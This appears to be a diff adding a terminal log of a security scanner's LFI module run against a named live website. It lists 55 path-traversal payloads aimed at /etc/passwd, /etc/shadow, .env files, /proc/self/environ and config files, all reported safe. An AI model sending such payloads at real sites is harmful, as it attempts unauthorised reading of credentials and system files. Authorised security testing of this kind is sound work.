@@ -1,0 +1,175 @@
+┌──(kali㉿NEUTRON)-[/mnt/e/Repo/raidscanner]
+└─$ docker compose run --rm raidscanner-cli
+WARN[0000] Found orphan containers ([c280f7465eca 1f4275c342f9]) for this project. If you removed or renamed this service in your compose file, you can run this command with the --remove-orphans flag to clean it up.
+
+╭─────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
+│                                                                                                             │
+│      ██████╗██╗   ██╗██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗ │
+│     ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝ │
+│     ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝  │
+│     ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝   │
+│     ╚██████╗   ██║   ██████╔╝███████╗██║  ██║███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║    │
+│      ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝    │
+│                                                                                                             │
+╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
+
+
+[ RaidScanner ]
+
+Available Scanners:
+  1. LFI Scanner       - Local File Inclusion
+  2. Open Redirect     - Unvalidated Redirects
+  3. SQL Injection     - Database Injection
+  4. XSS Scanner       - Cross-Site Scripting
+  5. CRLF Injection    - HTTP Response Splitting
+  6. Exit
+
+
+[?] Select an option (1-6): 1
+
+LFI Scanner
+
+
+[?] Enter target URL(s):
+    (Enter one URL per line, press Enter twice when done)
+URL: https://ist-edu-bd.vercel.app/notices?file=
+URL:
+
+[?] Number of threads (1-10, default 5):
+
+[*] Loaded 55 payloads
+[*] Starting scan with 5 threads...
+[*] Target: https://ist-edu-bd.vercel.app/notices?file=
+
+====================================================================================================
+[SAFE]  Status: 200 | Time: 0.17s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../proc/cpuinfo
+[SAFE]  Status: 200 | Time: 0.18s
+        URL: https://ist-edu-bd.vercel.app/notices?file=....//....//....//etc/passwd
+[SAFE]  Status: 200 | Time: 0.18s
+        URL: https://ist-edu-bd.vercel.app/notices?file=..%25252F..%25252F..%25252Fetc%25252Fpasswd
+[SAFE]  Status: 200 | Time: 0.18s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../etc/passwd
+[SAFE]  Status: 200 | Time: 0.18s
+        URL: https://ist-edu-bd.vercel.app/notices?file=..%252F..%252F..%252Fetc%252Fpasswd
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=..//..//..//etc/passwd
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../../../../etc/passwd
+[SAFE]  Status: 200 | Time: 0.16s
+        URL: https://ist-edu-bd.vercel.app/notices?file=..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=....%5C/....%5C/....%5C/windows/win.ini
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../package.json
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../package.json
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=package.json
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../package.json
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../README.md
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../README.md
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../README.md
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=README.md
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../vercel.json
+[SAFE]  Status: 200 | Time: 0.13s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../vercel.json
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../vercel.json
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=vercel.json
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../proc/self/environ
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../.env
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../.env
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../.env
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=.env
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../.env.local
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../.env.local
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../.env.local
+[SAFE]  Status: 200 | Time: 0.13s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/etc/passwd
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=.env.local
+[SAFE]  Status: 200 | Time: 0.13s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/etc/shadow
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/etc/hosts
+[SAFE]  Status: 200 | Time: 0.13s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../proc/cpuinfo
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/proc/self/environ
+[SAFE]  Status: 200 | Time: 1.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=..%255c..%255c..%255c..%255c..%255cwindows%255c...
+[SAFE]  Status: 200 | Time: 0.13s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/proc/version
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=c%3A%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chos...
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=c%3A/windows/system32/drivers/etc/hosts
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/var/log/apache2/access.log
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/var/www/html/index.php
+[SAFE]  Status: 200 | Time: 0.33s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/windows/system32/drivers/etc/hosts
+[SAFE]  Status: 200 | Time: 0.13s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../app/config/database.yml
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/var/log/apache2/error.log
+[SAFE]  Status: 200 | Time: 0.16s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../config/database.php
+[SAFE]  Status: 200 | Time: 0.19s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../wp-config.php
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../wp-config.php
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../wp-config.php
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../proc/version
+[SAFE]  Status: 200 | Time: 0.13s
+        URL: https://ist-edu-bd.vercel.app/notices?file=wp-config.php
+[SAFE]  Status: 200 | Time: 0.15s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/etc/mysql/my.cnf
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/etc/httpd/conf/httpd.conf
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/usr/local/apache2/conf/httpd.conf
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=/etc/apache2/apache2.conf
+[SAFE]  Status: 200 | Time: 0.14s
+        URL: https://ist-edu-bd.vercel.app/notices?file=../../../etc/hosts
+====================================================================================================
+
+======================================================================
+SCAN RESULTS
+======================================================================
+
+Scan Type: LFI
+Duration: 1 seconds
+Total Scanned: 55
+Vulnerabilities Found: 0
+
+✓ No vulnerabilities found
+
+======================================================================
+
+
+[?] Save report? (y/n): y
+[✓] Report saved: /app/reports/lfi_report_20251206_121837.html
+[✓] JSON report saved: /app/reports/lfi_report_20251206_121837.json
+
+Press Enter to continue...
